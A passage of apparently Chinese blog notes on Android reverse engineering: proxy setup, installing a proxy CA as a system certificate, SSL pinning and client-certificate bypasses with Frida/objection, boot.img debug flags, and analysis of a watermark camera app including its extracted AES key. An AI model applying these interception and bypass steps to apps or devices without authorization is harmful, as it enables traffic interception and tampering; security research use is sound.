<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20220106211229311.png" alt="image-20220106211229311"></p>
</li>
</ol>
</li>
<li>
<p>配置SSL代理设置</p>
<ol>
<li>菜单栏<code>Proxy</code>-&gt;<code>SSL Proxying settings...</code></li>
<li>勾选【Enable SSL Proxying】</li>
<li>【Include】下添加<code>*:443</code>或者<code>*:*</code></li>
<li>点击【OK】</li>
</ol>
</li>
</ol>
<p><strong>手机代理设置 8889端口及SOCK5代理模式</strong></p>
<p>菜单栏<code>Proxy</code>-&gt;<code>Windows Proxy(Ctrl+shift+P)</code>：Windows抓包开关（关闭后可不抓Windows的包）</p>
<p>同时<code>Proxy</code>-&gt;<code>proxying settings...</code>-&gt;<code>Windows</code>中可取消启动时自动打开windows抓包</p>
<hr>
<p>Charles抓包外网APP：配置External Proxy Settings设置来配置代理（<strong>可将包转发到BP，形成app-&gt;Charles-&gt;BurpSuite-&gt;Server链路</strong>）</p>
<h4 id="Charles添加新证书">Charles添加新证书<a class="header-anchor" href="#Charles添加新证书"> ¶ </a></h4>
<ol>
<li>菜单栏<code>Proxy</code>→<code>SSL Proxy Settings</code>→<code>Client Certificates</code>→<code>Add</code>添加新的证书</li>
<li>输入指定的域名IP以及端口并导入p12格式或者pem格式的证书</li>
</ol>
<p>之后即可将Charles伪装成使用特定证书的客户端，最终达到正常抓包的目的</p>
<h3 id="Burpsuit">Burpsuit<a class="header-anchor" href="#Burpsuit"> ¶ </a></h3>
<h4 id="Burpsuit配置上游代理">Burpsuit配置上游代理<a class="header-anchor" href="#Burpsuit配置上游代理"> ¶ </a></h4>
<p>（访问google）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20220424103048995.png" alt="image-20220424103048995"></p>
<h4 id="Burpsuit中文乱码">Burpsuit中文乱码<a class="header-anchor" href="#Burpsuit中文乱码"> ¶ </a></h4>
<p>请求与响应报文中文乱码：字体为中文字体（如果有不带编码格式的响应需要在此修改，修改编码<code>UTF-8</code>）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20220424095508443.png" alt="image-20220424095508443"></p>
<h4 id="Burpsuit插件">Burpsuit插件<a class="header-anchor" href="#Burpsuit插件"> ¶ </a></h4>
<p>菜单栏Extender -》 BAppStore</p>
<ul>
<li>Copy as Python-Requests  ----  一键复制成python代码</li>
<li>Non HTTP Proxy（NoPE）---- 抓取非HTTP协议的数据（有些包抓不到的时候，可以尝试，原理是用伪造的DNS服务器来抓取数据）</li>
<li>JSON Query ---- 解析json数据…</li>
</ul>
<h2 id="Android配置">Android配置<a class="header-anchor" href="#Android配置"> ¶ </a></h2>
<h3 id="配置系统证书">配置系统证书<a class="header-anchor" href="#配置系统证书"> ¶ </a></h3>
<p>Android7.0系统证书目录：<code>/system/etc/security/cacerts/</code></p>
<p>用户证书目录：<code>/data/misc/user/0/cacerts-added/</code>（可以先导入用户证书、之后移动至系统证书目录、省去重命名等步骤）</p>
<h4 id="计算证书hash值">计算证书hash值<a class="header-anchor" href="#计算证书hash值"> ¶ </a></h4>
<p>需计算相应证书的hash值</p>
<blockquote>
<p><code>openssl version</code>查看openssl版本；在1.0以上使用<code>-subject_hash_old</code>、1.0以下使用<code>-subject_hash</code></p>
</blockquote>
<p><code>.cer</code>证书</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl x509 -subject_hash_old -<span class="keyword">in</span> FiddlerRoot.cer -inform der</span><br></pre></td></tr></table></figure>
<p>对于<code>.pem</code>证书</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl x509 -subject_hash_old -<span class="keyword">in</span> charles-proxy-ssl-proxying-certificate.pem</span><br></pre></td></tr></table></figure>
<p>其中<code>cer</code>与<code>.pem</code>互转</p>
<blockquote>
<p>.pem证书转.cer证书</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;openssl x509 -outform der -<span class="keyword">in</span> demo.pem -out demo.cer</span><br></pre></td></tr></table></figure>
<p>.cer证书转.pem证书</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;openssl x509 -inform der -<span class="keyword">in</span> demo.cer -out demo.pem</span><br></pre></td></tr></table></figure>
<p>系统证书目录证书格式为<code>.pem</code></p>
</blockquote>
<h4 id="重命名证书">重命名证书<a class="header-anchor" href="#重命名证书"> ¶ </a></h4>
<p>将证书重命名为<code>[hashcode].0</code></p>
<h4 id="拷贝证书进入系统根证书目录">拷贝证书进入系统根证书目录<a class="header-anchor" href="#拷贝证书进入系统根证书目录"> ¶ </a></h4>
<p>进行证书临时拷贝</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb push hash.0 /sdcard/</span><br></pre></td></tr></table></figure>
<p>先将根目录重新挂载为可读可写目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb shell</span><br><span class="line">su</span><br><span class="line">mount -o rw,remount /</span><br></pre></td></tr></table></figure>
<p>将证书移动到证书目录并赋予权限、修改用户和属组</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mv /sdcard/hash.0 /system/etc/security/cacerts/</span><br><span class="line"><span class="built_in">cd</span> /system/etc/security/cacerts/</span><br><span class="line">chmod 644 hash.0</span><br><span class="line">chown root:root hash.0</span><br></pre></td></tr></table></figure>
<p>重启</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">reboot</span><br></pre></td></tr></table></figure>
<p>其中系统凭据能找到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Fiddler: DO_NOT_TRUST</span><br><span class="line">Charles:XK72 Ltd</span><br></pre></td></tr></table></figure>
<blockquote>
<p>安卓8以上 修改system读写权限</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb root</span><br><span class="line">adb disable-verity</span><br><span class="line">adb reboot        // 必须重启一次，不然无法生效</span><br><span class="line"></span><br><span class="line">adb root</span><br><span class="line">adb remount</span><br></pre></td></tr></table></figure>
<p>未测试</p>
</blockquote>
<h4 id="安卓10以上，配置系统证书">安卓10以上，配置系统证书<a class="header-anchor" href="#安卓10以上，配置系统证书"> ¶ </a></h4>
<p><a href="https://github.com/NVISOsecurity/MagiskTrustUserCerts">https://github.com/NVISOsecurity/MagiskTrustUserCerts</a></p>
<p><a href="https://github.com/Magisk-Modules-Repo/movecert">https://github.com/Magisk-Modules-Repo/movecert</a></p>
<h3 id="配置代理软件">配置代理软件<a class="header-anchor" href="#配置代理软件"> ¶ </a></h3>
<h3 id="adb命令代理">adb命令代理<a class="header-anchor" href="#adb命令代理"> ¶ </a></h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb shell settings put global http_proxy 127.0.0.1:8888</span><br></pre></td></tr></table></figure>
<h4 id="WiFi代理-不建议">WiFi代理(不建议)<a class="header-anchor" href="#WiFi代理-不建议"> ¶ </a></h4>
<ol>
<li>wifi修改网络</li>
<li>高级选项</li>
<li>代理：手动</li>
<li>设置主机和端口</li>
</ol>
<h4 id="Drony">Drony<a class="header-anchor" href="#Drony"> ¶ </a></h4>
<p><a href="https://apkpure.com/drony/org.sandroproxy.drony">Drony for Android - APK Download (apkpure.com)</a></p>
<ol>
<li>右滑到设置，点击【Networks(网络)-Wifi(无线网络)】</li>
<li>选择【当前Wifi】</li>
<li>【Proxy type(代理類型)】选择【Manual(手動)】</li>
<li>设置【Hostname(主機名)】和【Port(端口)】</li>
<li>将【Filter default value(過濾默認值)】改为【4 Direct all(引導全部)】（可改可不改）</li>
<li>进入【Rules(規則)】</li>
<li>新建规则，选择【本地代理鏈全部】，【选择相应APP】，其他不选</li>
<li>在开始页面，将【OFF】改为【ON】，开始代理</li>
</ol>
<h4 id="Postern">Postern<a class="header-anchor" href="#Postern"> ¶ </a></h4>
<p><a href="https://play.google.com/store/apps/details?id=com.tunnelworkshop.postern&amp;hl=zh&amp;gl=US">Postern - Google Play 上的应用</a></p>
<p>安装postern</p>
<h5 id="配置代理">配置代理<a class="header-anchor" href="#配置代理"> ¶ </a></h5>
<p>服务器名称：随意<br>
服务器地址：电脑局域网地址<br>
服务器端口：8888（与fiddler等端口一致）<br>
代理类型：HTTPS/HTTP CONNECT<br>
保存</p>
<p><strong>另为配合Charles，配置一个代理类型为<code>SOCKS5</code>，以捕获该类型的数据包</strong>，端口等要与电脑抓包软件相符</p>
<h5 id="配置规则">配置规则<a class="header-anchor" href="#配置规则"> ¶ </a></h5>
<p>匹配类型: 匹配所有地址<br>
动作: 通过代理连接<br>
代理/代理组：选择相应代理<br>
勾选开启抓包<br>
目标地址：*<br>
保存</p>
<h5 id="右侧菜单打开VPN">右侧菜单打开VPN<a class="header-anchor" href="#右侧菜单打开VPN"> ¶ </a></h5>
<p>右侧菜单打开VPN</p>
<h4 id="SocksDroid">SocksDroid<a class="header-anchor" href="#SocksDroid"> ¶ </a></h4>
<p><a href="https://github.com/PeterCxy/SocksDroid">PeterCxy/SocksDroid (github.com)</a></p>
<h2 id="调试WebView">调试WebView<a class="header-anchor" href="#调试WebView"> ¶ </a></h2>
<p>使用Chrome DevTools <a href="https://developer.chrome.com/docs/devtools/">Chrome DevTools - Chrome Developers</a></p>
<ol>
<li>
<p>电脑usb连接手机</p>
</li>
<li>
<p>Chrome访问地址<code>chrome://inspect</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20220106141702599.png" alt="image-20220106141702599"></p>
</li>
</ol>
<p>该调试方法依赖于 APP自身必须调用<code>WebView.setWebContentsDebuggingEnabled(true);</code>才会允许被DevTools调试</p>
<p>可以安装Xopsed模块 <a href="https://github.com/feix760/WebViewDebugHook">GitHub - feix760/WebViewDebugHook: Use Xposed force all webView to debug on android 4.4+</a></p>
<p>自行编写 只需要在目标APP进程中调用静态方法<code>WebView.setWebContentsDebuggingEnabled(true);</code></p>
<h2 id="HOOK抓包">HOOK抓包<a class="header-anchor" href="#HOOK抓包"> ¶ </a></h2>
<p>清空<code>~/.objection/objection.log</code>日志文件，objection载入APP</p>
<p>获取加载的所有类</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">android hooking list classes</span><br></pre></td></tr></table></figure>
<p>关闭objection，使用grep来过滤网络相关类。结果保存到一个文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat objection.log | grep -i HttpURLConnection &gt;&gt; classes.txt</span><br><span class="line">cat objection.log | grep -i okhttp &gt;&gt; classes.txt</span><br><span class="line">cat objection.log | grep -i okhttp3 &gt;&gt; classes.txt</span><br></pre></td></tr></table></figure>
<p>在该文件 每行行首添加<code>android hooking watch class</code>(多行编辑)</p>
<p>objection载入APP时，使用<code>-c</code>参数选定命令文件载入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">objection -g com.example.app explore -c <span class="string">&quot;classes.txt&quot;</span></span><br></pre></td></tr></table></figure>
<p>可以确定APP的网络请求框架，</p>
<p>之后定位到APP自身的具体方法</p>
<ul>
<li>对混淆后的 okhttp 进行Hook：<a href="https://github.com/siyujie/okhttpLogger-Frida">siyujie/OkHttpLogger-Frida: Frida 实现拦截okhttp的脚本 (github.com)</a></li>
<li><a href="https://github.com/r0ysue/r0capture">r0ysue/r0capture: 安卓应用层抓包通杀脚本 (github.com)</a></li>
</ul>
<h2 id="抓包对抗">抓包对抗<a class="header-anchor" href="#抓包对抗"> ¶ </a></h2>
<ul>
<li>SSL Pinning，又称证书绑定，可以说是客户端校验服务器的进阶版：该种方式不仅校验服务器证书是否是系统中的可信凭证，在通信过程中甚至连系统内置的证书都不信任而只信任App指定的证书。一旦发现服务器证书为非指定证书即停止通信，最终导致即使将Charles证书安装到系统信任凭据中也无法生效。</li>
<li>服务器校验客户端(双向校验)：这种方式发生在HTTPS验证身份阶段，服务器在接收到客户端的公钥后，在发送session key之前先对客户端的公钥进行验证，如果不是信任的证书公钥，服务器就中止和客户端的通信。</li>
</ul>
<h3 id="SSL-Pinning-Bypass">SSL Pinning Bypass<a class="header-anchor" href="#SSL-Pinning-Bypass"> ¶ </a></h3>
<p>证书绑定校验（客户端校验证书）</p>
<p>对于Android APP来说通常有两种方式：</p>
<ul>
<li>客户端持有证书公钥hash</li>
<li>客户端持有证书文件</li>
</ul>
<p>校验分为两种方式：</p>
<ul>
<li>代码校验</li>
<li>配置校验：<code>res/xml/network_security_config.xml</code></li>
</ul>
<h4 id="判断">判断<a class="header-anchor" href="#判断"> ¶ </a></h4>
<p>抓包报错</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Client closed the connection before a request was made. Possibly the SSL certificate was rejected.</span><br><span class="line">You may need to configure your browser or application to trust the Charles Root Certificate. See SSL Proxying in the Help menu.</span><br></pre></td></tr></table></figure>
<p>定位：objection HOOK<code>Java.io.File.\$init</code>，查看是否有参数为<code>/system/etc/security/cacerts</code></p>
<h4 id="绕过">绕过<a class="header-anchor" href="#绕过"> ¶ </a></h4>
<h5 id="Objection">Objection<a class="header-anchor" href="#Objection"> ¶ </a></h5>
<p>objection提供命令来实现SSL Pinning Bypass</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">android sslpinning <span class="built_in">disable</span></span><br></pre></td></tr></table></figure>
<h5 id="DroidSSLUnpinning">DroidSSLUnpinning<a class="header-anchor" href="#DroidSSLUnpinning"> ¶ </a></h5>
<p><a href="https://github.com/WooyunDota/DroidSSLUnpinning">WooyunDota/DroidSSLUnpinning: Android certificate pinning disable tools (github.com)</a></p>
<h5 id="JustTrustMe">JustTrustMe<a class="header-anchor" href="#JustTrustMe"> ¶ </a></h5>
<p><a href="https://github.com/Fuzion24/JustTrustMe">Fuzion24/JustTrustMe: An xposed module that disables SSL certificate checking for the purposes of auditing an app with c ert pinning (github.com)</a>：自行编译仓库代码获得最新APP</p>
<h5 id="JustTrustMePlush">JustTrustMePlush<a class="header-anchor" href="#JustTrustMePlush"> ¶ </a></h5>
<h5 id="HOOK抓包-2">HOOK抓包<a class="header-anchor" href="#HOOK抓包-2"> ¶ </a></h5>
<ul>
<li><a href="https://github.com/siyujie/OkHttpLogger-Frida">siyujie/OkHttpLogger-Frida: Frida 实现拦截okhttp的脚本 (github.com)</a></li>
<li><a href="https://github.com/BigFaceCat2017/frida_ssl_logger">BigFaceCat2017/frida_ssl_logger: ssl_logger based on frida (github.com)</a></li>
<li><a href="https://github.com/r0ysue/r0capture">r0ysue/r0capture: 安卓应用层抓包通杀脚本 (github.com)</a></li>
</ul>
<h3 id="服务器校验客户端证书">服务器校验客户端证书<a class="header-anchor" href="#服务器校验客户端证书"> ¶ </a></h3>
<h4 id="判断-2">判断<a class="header-anchor" href="#判断-2"> ¶ </a></h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">400 No required SSL certificate was sent</span><br></pre></td></tr></table></figure>
<h4 id="绕过-2">绕过<a class="header-anchor" href="#绕过-2"> ¶ </a></h4>
<p>逆向分析代码 或 Frida hook获取证书密钥</p>
<p><a href="http://keystore-explorer.org/">KeyStore Explorer (keystore-explorer.org)</a> 转换证书格式</p>
<p>将App中内置的证书导入抓包软件（charles或Burp）中，使得服务端认为自己仍旧是在与其信任的客户端进行通信，最终达到欺骗服务器的作用。</p>
<h3 id><a class="header-anchor" href="#"> ¶ </a></h3>
<h2 id="好文">好文<a class="header-anchor" href="#好文"> ¶ </a></h2>
<ul>
<li><a href="https://ch3nye.top/Android-HTTPS%E8%AE%A4%E8%AF%81%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F%E5%92%8C%E5%AF%B9%E6%8A%97%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/">Android HTTPS认证的N种方式和对抗方法总结 (ch3nye.top)</a></li>
</ul>
]]></content>
      <categories>
        <category>Android逆向</category>
        <category>过程记录备查</category>
      </categories>
      <tags>
        <tag>Android逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>编辑Android镜像boot.img修改全局可调试</title>
    <url>/AndroidReverse/2021/Edit_the_Android_image_boot.img/</url>
    <content><![CDATA[<p>@[toc]</p>
<h1 id="编辑Android镜像boot-img修改全局可调试">编辑Android镜像boot.img修改全局可调试<a class="header-anchor" href="#编辑Android镜像boot-img修改全局可调试"> ¶ </a></h1>
<h2 id="boot-img解包打包工具">boot.img解包打包工具<a class="header-anchor" href="#boot-img解包打包工具"> ¶ </a></h2>
<p><a href="https://github.com/Forgo7ten/BootImgTool">https://github.com/Forgo7ten/BootImgTool</a></p>
<h2 id="一、解压谷歌原版镜像">一、解压谷歌原版镜像<a class="header-anchor" href="#一、解压谷歌原版镜像"> ¶ </a></h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/AndroidReverse/2021/Edit_the_Android_image_boot/0a9a3041c6d44fb8b5e19f3f95d183c8.png" alt="在这里插入图片描述"></p>
<h2 id="二、打开zip压缩包，复制出boot-img文件">二、打开zip压缩包，复制出<code>boot.img</code>文件<a class="header-anchor" href="#二、打开zip压缩包，复制出boot-img文件"> ¶ </a></h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/AndroidReverse/2021/Edit_the_Android_image_boot/3b86d55e950a4426a1bd2f0bbedf09ff.png" alt="在这里插入图片描述"></p>
<h2 id="三、对boot-img进行解包">三、对<code>boot.img</code>进行解包<a class="header-anchor" href="#三、对boot-img进行解包"> ¶ </a></h2>
<p><strong>首先要编译BootImgTool</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> BootImgTool/</span><br><span class="line">./build.sh</span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/AndroidReverse/2021/Edit_the_Android_image_boot/2969e74075a246218a6e5b9d5e432ed7.png" alt="在这里插入图片描述"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./bin/unpack-bootimg.sh ../boot.img </span><br></pre></td></tr></table></figure>
<p>会在boot.img同目录生成解包文件<br>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/AndroidReverse/2021/Edit_the_Android_image_boot/d825a31b2691485b8907193e81160f09.png" alt="在这里插入图片描述"></p>
<h2 id="五、编辑prop-default文件">五、编辑<code>prop.default</code>文件<a class="header-anchor" href="#五、编辑prop-default文件"> ¶ </a></h2>
<p>进入<code>boot.img-ramdisk</code>文件夹，编辑<code>default.prop</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ro.secure=0</span><br><span class="line"></span><br><span class="line">ro.adb.secure=0</span><br><span class="line"></span><br><span class="line">ro.debuggable=1</span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/AndroidReverse/2021/Edit_the_Android_image_boot/334100c7d47a4a95bfa83a7286c54920.png" alt="在这里插入图片描述"></p>
<h2 id="六、对boot-img重打包">六、对boot.img重打包<a class="header-anchor" href="#六、对boot-img重打包"> ¶ </a></h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./bin/repack-bootimg.sh tmp/boot.img-kernel.gz tmp/boot.img-ramdisk tmp/new.img</span><br></pre></td></tr></table></figure>
<h2 id="七、刷入新img">七、刷入新img<a class="header-anchor" href="#七、刷入新img"> ¶ </a></h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb reboot bootloader</span><br><span class="line">fastboot flash boot new.img</span><br><span class="line">fastboot reboot</span><br></pre></td></tr></table></figure>
<p>@TODO：刷机后无法开机，就算仅仅是解包再打包也无法正常开机。不知原因</p>
<p>[<a href="https://forum.xda-developers.com/t/tool-android-image-kitchen-unpack-repack-kernel-ramdisk-win-android-linux-mac.2073775/">TOOL] Android Image Kitchen - Unpack/Repack Kernel Ramdisk [Win/Android/Linux/Mac] | XDA Forums (xda-developers.com)</a></p>
]]></content>
      <categories>
        <category>Android逆向</category>
        <category>过程记录备查</category>
      </categories>
      <tags>
        <tag>Android逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>今日水印相机自定义水印</title>
    <url>/AndroidReverse/2021/Crack_com.xhey.xcamera/</url>
    <content><![CDATA[<h1 id="今日水印相机自定义水印">今日水印相机自定义水印<a class="header-anchor" href="#今日水印相机自定义水印"> ¶ </a></h1>
<p>@app_version：v2.8.19.10</p>
<p><a href="https://wwx.lanzoui.com/i8KE0sgl02h">今日水印相机_v2.8.19.10-E6F9CE50D9CC85A5FD433DD1FEE1F863 Download</a></p>
<p>apk没有加壳，还是比较好分析的</p>
<h2 id="抓包">抓包<a class="header-anchor" href="#抓包"> ¶ </a></h2>
<p>打开app开始抓包，有以下几个api</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/AndroidReverse/2021/Crack_com.xhey/image-20210810004740692.png" alt="image-20210810004740692"></p>
<h2 id="逆向分析">逆向分析<a class="header-anchor" href="#逆向分析"> ¶ </a></h2>
<h3 id="分析天气参数的获取">分析天气参数的获取<a class="header-anchor" href="#分析天气参数的获取"> ¶ </a></h3>
<h4 id="jeb分析">jeb分析<a class="header-anchor" href="#jeb分析"> ¶ </a></h4>
<p>jeb中搜索相应的URI</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/AndroidReverse/2021/Crack_com.xhey/image-20210810004938096.png" alt="image-20210810004938096"></p>
<p>选择第二个来到 一个所有request方法的类</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/AndroidReverse/2021/Crack_com.xhey/image-20210810005040994.png" alt="image-20210810005040994"></p>
<p>摁X进行交叉引用</p>
<p>参数1和参数2即为经纬度坐标</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/AndroidReverse/2021/Crack_com.xhey/image-20210810005122554.png" alt="image-20210810005122554"></p>
<p>来到这里</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/AndroidReverse/2021/Crack_com.xhey/image-20210810005156768.png" alt="image-20210810005156768"></p>
<p>发现内部类对其进行了解析，强转为<code>WeatherInfo</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WeatherInfo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String apparentTemperature; <span class="comment">// 体感温度：30</span></span><br><span class="line">    <span class="keyword">public</span> String aqi;   <span class="comment">// 空气质量指数：37</span></span><br><span class="line">    <span class="keyword">public</span> String aqiLevel; <span class="comment">// 空气质量等级：优</span></span><br><span class="line">    <span class="keyword">public</span> String humidity; <span class="comment">// 湿度：75%</span></span><br><span class="line">    <span class="keyword">public</span> String pressure; <span class="comment">// 压强：1001</span></span><br><span class="line">    <span class="keyword">public</span> String temperature; <span class="comment">// 温度：27</span></span><br><span class="line">    <span class="keyword">public</span> String weather; <span class="comment">// 天气：晴</span></span><br><span class="line">    <span class="keyword">public</span> String winddirection; <span class="comment">// 风向：西南风</span></span><br><span class="line">    <span class="keyword">public</span> String windpower; <span class="comment">// 风力：1级</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接下来就是如何hook该内部类了</p>
<h4 id="调试验证">调试验证<a class="header-anchor" href="#调试验证"> ¶ </a></h4>
<p>运行fridaserver</p>
<p>使用frida的objection工具</p>
<p>先启动目标app</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">objection -N -h 192.168.0.104 -p 8888 -d -g com.xhey.xcamera explore</span><br></pre></td></tr></table></figure>
<p>然后查找<code>com.xhey.xcamera.e</code>的类</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">com.xhey.xcamera on (google: 8.1.0) [net] <span class="comment"># android hooking search classes com.xhey.xcamera.e                                                       </span></span><br><span class="line">com.xhey.xcamera.e</span><br><span class="line">com.xhey.xcamera.e<span class="variable">$1</span></span><br><span class="line">com.xhey.xcamera.e<span class="variable">$5</span></span><br><span class="line">com.xhey.xcamera.e<span class="variable">$6</span></span><br><span class="line">com.xhey.xcamera.e<span class="variable">$8</span></span><br><span class="line">com.xhey.xcamera.e<span class="variable">$a</span></span><br><span class="line">com.xhey.xcamera.e<span class="variable">$b</span></span><br><span class="line"></span><br><span class="line">Found 7 classes</span><br></pre></td></tr></table></figure>
<p>挨个查看每个内部类的方法</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">com.xhey.xcamera on (google: 8.1.0) [net] <span class="comment"># android hooking list class_methods com.xhey.xcamera.e$1                                                 </span></span><br><span class="line">private static void com.xhey.xcamera.e<span class="variable">$1</span>.b(xhey.com.network.model.BaseResponse)</span><br><span class="line">public static void com.xhey.xcamera.e<span class="variable">$1</span>.lambda<span class="variable">$Wc1CpEPvMWi1606k4HUcLAjQgiw</span>(xhey.com.network.model.BaseResponse)</span><br><span class="line">public void com.xhey.xcamera.e<span class="variable">$1</span>.a(xhey.com.network.model.BaseResponse&lt;com.xhey.xcamera.data.model.bean.ConfigStatus&gt;)</span><br><span class="line">public void com.xhey.xcamera.e<span class="variable">$1</span>.onError(java.lang.Throwable)</span><br><span class="line">public void com.xhey.xcamera.e<span class="variable">$1</span>.onSuccess(java.lang.Object)</span><br><span class="line"></span><br><span class="line">Found 5 method(s)</span><br></pre></td></tr></table></figure>
<p>发现<code>e$1</code>,<code>e$5</code>,<code>e$8</code>具有相同的方法，且与上反编译源码中方法类似</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> clazz = Java.use(<span class="string">&#x27;com.xhey.xcamera.e$5&#x27;</span>);</span><br><span class="line">        clazz.a.implementation = <span class="function"><span class="keyword">function</span> (<span class="params">response_argu</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> result = clazz.a.apply(<span class="built_in">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">            <span class="keyword">var</span> response = Java.cast(response_argu, Java.use(<span class="string">&quot;xhey.com.network.model.BaseResponse&quot;</span>));</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;BaseResponse.code&quot;</span>, response.code.value);</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;BaseResponse.data&quot;</span>, response.data.value);</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;BaseResponse.msg&quot;</span>, response.msg.value);</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;BaseResponse.toast_msg&quot;</span>, response.toast_msg.value);</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">setImmediate(main)</span><br></pre></td></tr></table></figure>
<p>frida来运行调试</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">frida -H 192.168.0.104:8888 -f com.xhey.xcamera -l syxj.js --no-pause</span><br></pre></td></tr></table></figure>
<p>打印出如下信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Remote::com.xhey.xcamera]-&gt; BaseResponse.code 200</span><br><span class="line">BaseResponse.data com.xhey.xcamera.data.model.bean.WeatherInfo@1d5fef8</span><br><span class="line">BaseResponse.msg success</span><br><span class="line">BaseResponse.toast_msg </span><br></pre></td></tr></table></figure>
<p>发现WeatherInfo，就是解密后的类</p>
<h3 id="分析时间的获取">分析时间的获取<a class="header-anchor" href="#分析时间的获取"> ¶ </a></h3>
<p>部分同天气获取，定位到</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/AndroidReverse/2021/Crack_com.xhey/image-20210810012037704.png" alt="image-20210810012037704"></p>
<p>其中<code>v1.build()</code>调用了aes，来对json字符串进行加密</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/AndroidReverse/2021/Crack_com.xhey/image-20210810012124362.png" alt="image-20210810012124362"></p>
<p>得到key和iv均为<code>&quot;xhey-cc4275fd-43&quot;</code>，AES模式为<code>&quot;AES/CBC/PKCS5Padding&quot;</code></p>
